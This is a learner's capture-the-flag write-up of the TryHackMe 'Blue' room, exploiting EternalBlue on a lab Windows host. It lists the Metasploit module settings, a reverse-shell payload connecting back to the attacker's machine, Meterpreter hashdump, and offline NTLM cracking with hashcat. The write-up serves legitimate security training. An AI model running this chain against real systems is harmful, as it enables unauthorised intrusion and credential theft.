# Blue: TryHackMe

**Difficulty:** Easy
**Category:** Windows Exploitation, SMB (MS17-010 / EternalBlue)
**Date completed:** 2026-09-24

## Summary

Blue is the classic intro to real exploitation: a Windows host left vulnerable to MS17-010, the SMB vulnerability EternalBlue made famous, exploited straight to a SYSTEM shell with Metasploit, then hunted for local password hashes and flags scattered across the filesystem. Unlike the fundamentals rooms before this, nothing here worked on the first try. The exploit itself failed three times in a row before I found a fix, and the target machine ended up unstable enough that I had to restart it mid-room. That failure and recovery process is most of what makes this one worth writing up.

## What I Did

**Recon.** Ran `nmap -sV -sC` against the target and got back three open ports: 139 and 445 (SMB/NetBIOS) and 3389 (RDP). The SMB service banner reported the host as a Windows Server 2012 R2 Datacenter build. Since 445 is the port EternalBlue targets, I confirmed the actual vulnerability directly instead of assuming from the OS banner alone, using Nmap's purpose-built check:

```
nmap --script smb-vuln-ms17-010 -p445 <target>
```

Came back `State: VULNERABLE`.

**First exploit attempts, and three straight failures.** In Metasploit, I loaded `exploit/windows/smb/ms17_010_eternalblue`, set RHOSTS and LHOST, and left the payload on its default, `windows/x64/meterpreter/reverse_tcp`. Ran it. Got back "Exploit completed, but no session was created." Ran it again. Same result. A third time. Same result.

EternalBlue works by corrupting kernel memory to hijack execution, and the module's own advanced options (`GroomAllocations`, `GroomDelta`) explicitly state they're tuned for Windows 7, Server 2008 R2, and Windows Embedded Standard 7, not the Server 2012 R2 banner this box reported. That mismatch is the most likely reason the multi-stage Meterpreter payload kept failing to land.

**The target went unstable.** After the third failed attempt, a follow-up Nmap scan showed port 445 shift from open to filtered, and the host stopped answering entirely on a rescan. A corrupted, partially-successful memory exploit doesn't just fail cleanly, it can crash the service or the box outright, and that's the most likely explanation here, since TryHackMe's own machine timer still showed over an hour left on the lease. I terminated and restarted the victim machine from the room page, which gave it a new IP, and confirmed with a fresh scan that SMB was open and vulnerable again before touching Metasploit a second time.

**The fix: switch payloads.** TryHackMe's own room notes suggested setting the payload to `windows/x64/shell/reverse_tcp`, a plain single-stage reverse shell instead of the multi-stage Meterpreter stager. Reconfigured RHOSTS and LHOST for the new IP, ran the exploit again, and landed a Windows shell on the first attempt.

```
whoami
```
returned `NT AUTHORITY\SYSTEM` immediately. No privilege escalation step needed, a kernel exploit like this lands with the highest privilege the exploited service already runs as.

**Upgrading to Meterpreter.** A plain shell doesn't have built-in post-exploitation tooling like hash dumping, so I backgrounded the session (Ctrl+Z) and ran:

```
use post/multi/manage/shell_to_meterpreter
set SESSION <id>
set LHOST <attacker IP>
run
```

That opened a second, full Meterpreter session against the same shell.

**Dumping and cracking hashes.** From the Meterpreter session:

```
hashdump
```

returned three accounts. Administrator and Guest both showed the same all-zero hash suffix, meaning empty or disabled passwords, nothing to crack. The real target was the third account, Jon, with a live NTLM hash. Isolated that hash into its own file and ran it through hashcat offline:

```
hashcat -m 1000 jonhash.txt /usr/share/wordlists/rockyou.txt
```

Cracked in about 8 seconds: `alqfna22`.

**Finding the flags.** Rather than trust a memorized path from someone else's writeup, I searched the whole filesystem directly from the shell:

```
dir C:\ /s /b | findstr flag
```

That turned up the three real flag files, plus a few Windows "Recent Files" shortcut noise (`.lnk` files pointing at flags that had already been opened, not the actual flag content):

- `C:\flag1.txt`
- `C:\Windows\System32\config\flag2.txt`
- `C:\Users\Jon\Documents\flag3.txt`

Read each with `type <path>` to capture the flag contents.

**The lab machine also timed out.** Mid-flag-hunt, the room's VM lease itself expired and both machines had to be relaunched with new IPs. Since the exploit path was already proven and this is the same base VM image every time the room spins up, I skipped re-running the vulnerability check and hash cracking (the password would be identical) and went straight to `exploit -> shell -> upgrade to Meterpreter -> re-run the same filesystem search` on the fresh instance to pull the flags a second time.

## What I Learned

- Real exploitation isn't fire-and-forget. EternalBlue failing three times in a row wasn't a sign something was set up wrong, it's a genuinely unreliable exploit against certain targets, and knowing when to change the payload instead of just retrying the same thing blind is the actual skill.
- A failed memory-corruption exploit can crash or destabilize the target instead of failing cleanly. Watching a live host go from open to filtered mid-session was the first time that stopped being a textbook warning and started being something I diagnosed myself.
- Nmap pings the target by default before scanning it, and Windows hosts commonly block ICMP while leaving TCP ports wide open. `-Pn` skips that ping check, and without it Nmap will falsely report a fully live, reachable host as down.
- There's a real difference between a plain reverse shell and a full Meterpreter session. The plain shell got me code execution, but Meterpreter's `hashdump` and other post-exploitation tooling needed the upgrade via `post/multi/manage/shell_to_meterpreter`.
- Getting SYSTEM through a kernel exploit skips privilege escalation entirely, since the exploited service was already running at that level. That's different from most footholds, which land as a low-privilege user first.
- Trusting a search over a memorized path paid off directly here: two of the three real flags were sitting in locations I wouldn't have guessed (a system config directory, a user's Documents folder), and the filesystem also had decoy shortcut files with "flag" in the name that weren't the actual data.

## Tools/Commands Used

- `nmap -sV -sC`: initial port and service version scan
- `nmap --script smb-vuln-ms17-010`: confirms MS17-010 vulnerability directly instead of guessing from the OS banner
- `nmap -Pn`: skips host-discovery ping, needed since the target blocked ICMP while staying reachable over TCP
- `msfconsole` / `exploit/windows/smb/ms17_010_eternalblue`: the EternalBlue exploit module
- `windows/x64/shell/reverse_tcp`: single-stage shell payload, used after the default Meterpreter stager repeatedly failed to land
- `post/multi/manage/shell_to_meterpreter`: upgrades a plain shell session into a full Meterpreter session
- `hashdump` (Meterpreter): pulls local SAM database password hashes
- `hashcat -m 1000`: offline NTLM hash cracking against the `rockyou.txt` wordlist
